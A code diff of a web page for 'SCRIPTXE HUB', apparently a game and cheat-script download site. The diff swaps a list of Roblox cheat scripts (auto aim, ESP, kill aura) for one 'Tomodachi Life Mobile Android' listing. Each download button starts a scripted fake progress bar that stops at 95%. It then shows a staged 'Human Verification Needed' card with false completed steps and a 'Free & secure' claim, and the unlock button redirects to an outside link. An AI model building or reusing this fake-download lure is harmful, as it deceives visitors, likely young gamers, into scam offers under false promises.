@@ -195,10 +195,8 @@
         footer {
             text-align: center;
             padding: 20px;
-            background: #000000;
             color: #aaa;
             font-size: 0.9rem;
-            border-top: 1px solid rgba(80, 80, 80, 0.7);
             margin-top: 40px;
         }
 
@@ -222,6 +220,7 @@
             text-decoration: none;
             white-space: nowrap;
             -webkit-tap-highlight-color: transparent;
+            animation: btnPulse 2s ease-in-out infinite;
         }
 
         .download-btn:active {
@@ -331,57 +330,298 @@
             font-weight: 600;
         }
 
-        .verify-text {
-            font-size: 14px;
-            margin-top: 10px;
-            margin-bottom: 15px;
-            color: #ddd;
-            line-height: 1.5;
+        /* ── VERIFY SECTION ── */
+        @keyframes borderGlow {
+
+            0%,
+            100% {
+                box-shadow: 0 0 0px rgba(242, 118, 33, 0.3), inset 0 0 0px rgba(242, 118, 33, 0);
+            }
+
+            50% {
+                box-shadow: 0 0 18px rgba(242, 118, 33, 0.55), inset 0 0 8px rgba(242, 118, 33, 0.08);
+            }
         }
 
-        .urgent-text {
-            font-size: 16px;
-            margin-top: 15px;
-            color: #ddd;
+        @keyframes shieldPop {
+            0% {
+                transform: scale(0.6) rotate(-10deg);
+                opacity: 0;
+            }
+
+            70% {
+                transform: scale(1.12) rotate(3deg);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(1) rotate(0deg);
+            }
+        }
+
+        @keyframes dotBlink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.2;
+            }
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(12px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes btnPulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 4px 20px rgba(242, 118, 33, 0.45);
+            }
+
+            50% {
+                transform: scale(1.04);
+                box-shadow: 0 6px 32px rgba(242, 118, 33, 0.75);
+            }
+        }
+
+        #verify-section {
+            animation: slideUp 0.45s ease both;
+        }
+
+        .verify-card {
+            margin-top: 18px;
+            border: 1px solid rgba(242, 118, 33, 0.35);
+            border-radius: 10px;
+            padding: 18px 16px 20px;
+            background: rgba(242, 118, 33, 0.06);
+            animation: borderGlow 2.6s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verify-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #F5AD1E, #F27621, transparent);
+        }
+
+        .verify-shield-wrap {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .verify-shield {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, #F5AD1E, #F27621);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: shieldPop 0.55s cubic-bezier(.36, 1.6, .5, 1) both;
+            box-shadow: 0 0 16px rgba(242, 118, 33, 0.5);
+            flex-shrink: 0;
+        }
+
+        .verify-shield svg {
+            width: 22px;
+            height: 22px;
+            fill: #fff;
+        }
+
+        .verify-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(255, 60, 60, 0.12);
+            border: 1px solid rgba(255, 80, 80, 0.35);
+            border-radius: 30px;
+            padding: 3px 10px;
+            font-family: 'Exo 2', sans-serif;
+            font-size: 10.5px;
+            font-weight: 700;
+            color: #ff6b6b;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            display: block;
+            width: fit-content;
+            margin: 0 auto 10px;
+        }
+
+        .verify-badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #ff4c4c;
+            border-radius: 50%;
+            animation: dotBlink 1.1s ease infinite;
+            display: inline-block;
+        }
+
+        .verify-headline {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13.5px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 7px;
+            line-height: 1.4;
+        }
+
+        .verify-sub {
+            font-family: 'Exo 2', sans-serif;
+            font-size: 12.5px;
+            color: #aaa;
+            line-height: 1.55;
+            margin-bottom: 16px;
+        }
+
+        .verify-sub span {
+            color: #F5AD1E;
             font-weight: 600;
-            text-align: center;
-            margin-bottom: 20px;
+        }
+
+        .verify-steps {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .vstep {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            font-family: 'Exo 2', sans-serif;
+            font-size: 10px;
+            color: #777;
+        }
+
+        .vstep-dot {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            border: 1.5px solid #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+        }
+
+        .vstep.done .vstep-dot {
+            background: linear-gradient(135deg, #F5AD1E, #F27621);
+            border-color: transparent;
+            color: #fff;
+        }
+
+        .vstep.active .vstep-dot {
+            border-color: #F5AD1E;
+            color: #F5AD1E;
+            box-shadow: 0 0 8px rgba(245, 173, 30, 0.4);
+        }
+
+        .vstep.done,
+        .vstep.active {
+            color: #ccc;
+        }
+
+        .vstep-line {
+            width: 22px;
+            height: 1.5px;
+            background: #2a2a2a;
+            margin-top: 14px;
+        }
+
+        .vstep-line.done {
+            background: linear-gradient(90deg, #F5AD1E, #F27621);
         }
 
         #verify-btn {
             font-family: 'Orbitron', sans-serif;
-            background: linear-gradient(135deg, #F5AD1E, #F27621);
-            border: 1px solid #444444;
-            box-shadow: 0 4px 15px rgba(40, 40, 40, 0.5);
-            color: #ffffff;
-            padding: 12px 50px;
-            font-size: 14px;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: bold;
             display: flex;
             align-items: center;
-            text-align: center;
             justify-content: center;
-            width: fit-content;
-            margin: 0 auto;
-            animation: pulse 2s infinite;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        #verify-btn:hover {
-            opacity: 0.9;
-        }
-
-        #verify-iframe {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
+            gap: 8px;
             width: 100%;
-            height: 100%;
+            padding: 13px 20px;
+            background: linear-gradient(135deg, #F5AD1E, #F27621);
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.05em;
+            border-radius: 8px;
             border: none;
-            z-index: 9999;
+            text-decoration: none;
+            cursor: pointer;
+            animation: btnPulse 2s ease-in-out infinite;
+            -webkit-tap-highlight-color: transparent;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #verify-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 60%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.18), transparent);
+            animation: shimmer 2.4s ease infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+
+            60%,
+            100% {
+                left: 160%;
+            }
+        }
+
+        #verify-btn svg {
+            width: 16px;
+            height: 16px;
+            fill: #fff;
+            flex-shrink: 0;
+        }
+
+        .verify-trust {
+            margin-top: 10px;
+            font-family: 'Exo 2', sans-serif;
+            font-size: 10.5px;
+            color: #555;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .verify-trust svg {
+            width: 11px;
+            height: 11px;
+            fill: #555;
         }
     </style>
 </head>
@@ -390,208 +630,31 @@
 
     <header>
         <div class="logo"><span>SCRIPTXE HUB</div>
-        <input type="text" id="searchBar" placeholder="Search for scripts...">
+        <input type="text" id="searchBar" placeholder="Search for games...">
     </header>
 
     <div class="breadcrumb">
-        <a href="https://scriptxe.xyz">Home</a> &gt;
-        <a href="https://scriptxe.xyz/scripts">Roblox</a> &gt;
-        <span>Scripts</span>
+        <a href="https://scriptxe.site">Home</a> &gt;
+        <a href="https://scriptxe.site">Games</a> &gt;
+        <span>Download</span>
     </div>
 
     <div class="cards-container">
 
         <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/7NZxcJBy/kick.jpg" alt="banner">
+            <img class="banner" src="https://i.ibb.co/gLwbX3Pd/tomodachi.avif" alt="banner">
             <div class="game-info-box">
                 <div class="game-info">
-                    <h3>Kick A Lucky block</h3>
-                    <p>Kick a Lucky Block scripts let you farm instantly and open unlimited lucky blocks. Get rare
-                        rewards, stack coins fast, and progress way quicker than normal players.</p>
-                    <p class="note">▶ Open Lucky Blocks Instantly</p>
-                    <p class="note">▶ Get Rare Rewards Fast</p>
-                    <p class="note">▶ Infinite Farm & Progress</p>
+                    <h3>Tomodachi Life Mobile Android</h3>
+                    <p>Tomodachi Life Living The Dream lets you create unique characters and watch their lives unfold on
+                        your
+                        island.</p>
+                    <p class="note">▶ Create & Customize Your Characters</p>
+                    <p class="note">▶ Build Relationships & Stories</p>
+                    <p class="note">▶ Experience Funny Random Events</p>
                 </div>
             </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/xp2m4v'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/jnQZZsS/Sailor.webp" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>Sailor Piece</h3>
-                    <p>Many players turn to the Sailor Piece script. It
-                        helps automate repetitive tasks like farming, completing quests, and collecting rewards.</p>
-                    <p class="note">▶ Auto Farm Bosses & Enemies</p>
-                    <p class="note">▶ Auto Skills + Auto Haki</p>
-                    <p class="note">▶ Fast Level, Beli & Drop Farm</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/34l766'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/PzxVkbfW/no-Filter.webp" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>Rivals</h3>
-                    <p>Enhance your Rivals combat with this powerful script — level up weapons, auto‑assist, and
-                        dominate
-                        every match.</p>
-                    <p class="note">▶ Auto Aim & Trigger Assist</p>
-                    <p class="note">▶ Fast Weapon Unlocks</p>
-                    <p class="note">▶ Smooth & Optimized Performance</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/7jjk9g'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner"
-                src="https://tr.rbxcdn.com/180DAY-3018fd2fdf89e93540f74a7052191425/768/432/Image/Webp/noFilter"
-                alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>99 Nights Script</h3>
-                    <p>Survive all 99 nights with powerful automation and survival tools. Auto‑farm, combat, teleports,
-                        and
-                        more included.</p>
-                    <p class="note">▶ Auto Farm & Auto Collect Resources</p>
-                    <p class="note">▶ Kill Aura & Combat Enhancements</p>
-                    <p class="note">▶ ESP & Teleport Utilities</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/kld9n8'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/mrj1wWYB/gag.webp" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>Grow A Garden Pet Spawner</h3>
-                    <p>Spawn any pet instantly for visual showcase. Pets are client-side only and visible only to you.
-                    </p>
-                    <p class="note">▶ Spawn Any Pet Visual Only</p>
-                    <p class="note">▶ Legendary and Exclusive Pets</p>
-                    <p class="note">▶ Instant Pet Preview</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/5nln5w'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/b5Wv5FXg/adoptme.jpg" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>Adopt Me Pet Spawner</h3>
-                    <p>Spawn any pet instantly for visual showcase. Pets are client-side only and visible only to you.
-                    </p>
-                    <p class="note">▶ Spawn Any Pet Visual Only</p>
-                    <p class="note">▶ Legendary and Exclusive Pets</p>
-                    <p class="note">▶ Instant Pet Preview</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/1xxrge'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/d0SYH9df/garden-horizons-release-date.webp" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>Garden Horizons</h3>
-                    <p>Get powerful auto farm features in Garden Horizons and grow your garden faster without wasting
-                        time.
-                    </p>
-                    <p class="note">▶ Auto Plant & Auto Harvest</p>
-                    <p class="note">▶ Auto Buy Seeds & Auto Sell Crops</p>
-                    <p class="note">▶ Fast Farm Progress & Money Boost</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/pqq1n2'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/11rwsDC/k.webp" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>knockout</h3>
-                    <p>This script is built for players who want full control of the ice. it removes the limitations
-                        that slow you down and lets you focus on staying alive</p>
-                    <p class="note">▶ Auto Aim & Auto Buy Egg</p>
-                    <p class="note">▶ Get Rainbow Skin</p>
-                    <p class="note">▶ Push Power & Unlimited Push</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/1xx8ge'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/8LJ3CRV4/no-Filter.webp" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>Escape Tsunami For Brainrots</h3>
-                    <p>Survive the tidal wave with this powerful script. Auto-escape, resource farming, and enhanced
-                        survival tools included.</p>
-                    <p class="note">▶ Auto-Detective & Sheriff ESP</p>
-                    <p class="note">▶ Instant Kill & Power Mod</p>
-                    <p class="note">▶ Player Radar & Undetectable</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/9vvenv'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner" src="https://i.ibb.co/tpBwZtPd/no-Filter.webp" alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>The Forge</h3>
-                    <p>Automate mining, forging, and combat in The Forge with powerful tools. Auto‑mine, auto‑forge, and
-                        more all script features included.</p>
-                    <p class="note">▶ Auto Mine & Auto Resource Collect</p>
-                    <p class="note">▶ Auto Forge & Instant Craft</p>
-                    <p class="note">▶ Kill Aura & ESP</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/27lvnk'); return false;">
-                <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
-                Download Now</a>
-        </div>
-
-        <div class="game-card">
-            <img class="banner"
-                src="https://tr.rbxcdn.com/180DAY-e265418ad831149f9cdb185a0a6913cd/768/432/Image/Webp/noFilter"
-                alt="banner">
-            <div class="game-info-box">
-                <div class="game-info">
-                    <h3>Fish It</h3>
-                    <p>Automate fishing and progression in Fish It! 🐟 with powerful tools. Auto‑fish, auto‑sell,
-                        teleports,
-                        and more all included.</p>
-                    <p class="note">▶ Auto Fish & Auto Reel</p>
-                    <p class="note">▶ Auto Sell & Auto Farm</p>
-                    <p class="note">▶ Teleport & Instant Catch</p>
-                </div>
-            </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/veonp2'); return false;">
+            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/o4er7n'); return false;">
                 <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
                 Download Now</a>
         </div>
@@ -627,7 +690,7 @@
 
     <div id="popup-overlay">
         <div class="popup-box">
-            <h3 id="popup-title">Preparing your script...</h3>
+            <h3 id="popup-title">Preparing your game...</h3>
 
             <p id="step-text" style="font-size:14px;color:#ddd;margin-top:10px;">Intalizing... 0%</p>
 
@@ -638,14 +701,67 @@
             </div>
 
             <div id="verify-section" style="display:none;">
-                <p class="verify-text urgent-text">
-                    <span style="color: red;" <strong>URGENT:</strong></span> Human verification required to finish
-                    unlocking your script!
-                </p>
-                <a id="verify-btn" href="#">VERIFY TO UNLOCK</a>
-            </div>
+                <div class="verify-card">
 
-            <iframe id="verify-iframe"></iframe>
+                    <div class="verify-shield-wrap">
+                        <div class="verify-shield">
+                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.35C17.25 21.15 21 16.25 21 11V5L12 1zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z" />
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="verify-badge">
+                        <span class="dot"></span> Action Required
+                    </div>
+
+                    <p class="verify-headline">Human Verification Needed</p>
+
+                    <p class="verify-sub">
+                        Your download is <span>95% complete</span>. Complete a quick<br>
+                        verification to unlock your game instantly.
+                    </p>
+
+                    <div class="verify-steps">
+                        <div class="vstep done">
+                            <div class="vstep-dot">✓</div>
+                            <span>Connect</span>
+                        </div>
+                        <div class="vstep-line done"></div>
+                        <div class="vstep done">
+                            <div class="vstep-dot">✓</div>
+                            <span>Download</span>
+                        </div>
+                        <div class="vstep-line done"></div>
+                        <div class="vstep active">
+                            <div class="vstep-dot">3</div>
+                            <span>Verify</span>
+                        </div>
+                        <div class="vstep-line"></div>
+                        <div class="vstep">
+                            <div class="vstep-dot">4</div>
+                            <span>Play</span>
+                        </div>
+                    </div>
+
+                    <a id="verify-btn" href="#">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                        </svg>
+                        UNLOCK GAME
+                    </a>
+
+                    <div class="verify-trust">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.35C17.25 21.15 21 16.25 21 11V5L12 1z" />
+                        </svg>
+                        Free &amp; secure · Takes less than 30 seconds
+                    </div>
+
+                </div>
+            </div>
 
             <script>
                 function startDownload(url) {
@@ -654,23 +770,21 @@
                     const bar = document.getElementById('progress-bar');
                     const txt = document.getElementById('progress-text');
                     const verify = document.getElementById('verify-section');
-                    const iframe = document.getElementById('verify-iframe');
                     const title = document.getElementById('popup-title');
 
                     popup.style.display = 'flex';
                     document.body.style.overflow = 'hidden';
                     verify.style.display = 'none';
-                    iframe.style.display = 'none';
                     bar.style.width = '0%';
                     txt.textContent = '0%';
                     step.textContent = 'Intalizing... 0%';
-                    title.textContent = 'Preparing your script...';
+                    title.textContent = 'Preparing your game...';
 
                     const steps = [22, 53, 78, 95];
                     const msgs = [
                         "Connecting to servers...",
                         "Downloading assets...",
-                        "Installing script files...",
+                        "Installing game files...",
                         "Finalizing..."
                     ];
                     let i = 0;
@@ -690,8 +804,7 @@
 
                                 document.getElementById('verify-btn').onclick = e => {
                                     e.preventDefault();
-                                    iframe.src = url;
-                                    iframe.style.display = 'block';
+                                    window.location.href = url;
                                 };
                             }, 3000);
                         }
